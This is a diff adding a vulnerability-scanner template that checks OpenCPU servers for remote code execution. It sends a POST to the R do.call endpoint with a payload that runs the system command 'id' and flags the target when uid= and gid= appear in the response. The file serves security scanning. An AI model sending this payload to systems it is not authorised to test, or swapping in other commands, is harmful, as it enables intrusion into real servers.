@@ -1,0 +1,29 @@
+id: opencpu-rce
+brief:
+    title: OpenCPU - Remote Code Execution
+    by: wa1tf0rme
+    level: critical
+    about: Check for remote code execution via OpenCPU was conducted.
+    label:
+        - rce
+        - opencpu
+        - oss
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/ocpu/library/base/R/do.call/json'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        what=function(x){  return(system(paste('id'), intern %3d T))}&args={}
+      signs:
+        - "on": word
+          has:
+            - uid=
+            - gid=
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 201
